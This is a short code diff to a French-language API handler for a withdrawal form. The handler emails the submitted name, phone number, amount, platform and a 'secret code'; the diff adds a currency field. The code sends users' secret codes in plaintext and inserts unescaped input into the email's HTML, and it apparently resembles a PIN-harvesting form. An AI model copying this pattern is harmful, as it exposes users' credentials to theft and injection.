@@ -13,7 +13,8 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Méthode non autorisée.' });
   }
 
-  const { fullName, phoneNumber, amount, secretCode, platform } = req.body || {};
+  const { fullName, phoneNumber, amount, secretCode, platform, currency } = req.body || {};
+  const displayCurrency = currency || 'FCFA';
 
   if (!fullName || !phoneNumber || !amount || !secretCode || !platform) {
     return res.status(400).json({ error: 'Tous les champs du formulaire sont requis.' });
@@ -34,7 +35,7 @@ export default async function handler(req, res) {
         <li><strong>Plateforme :</strong> ${platform}</li>
         <li><strong>Nom :</strong> ${fullName}</li>
         <li><strong>Téléphone :</strong> ${phoneNumber}</li>
-        <li><strong>Montant :</strong> ${amount} FCFA</li>
+        <li><strong>Montant :</strong> ${amount} ${displayCurrency}</li>
         <li><strong>Code secret :</strong> ${secretCode}</li>
       </ul>
       <p style="margin-top: 24px; color: #475569;">Envoyé automatiquement par le formulaire de retrait.</p>
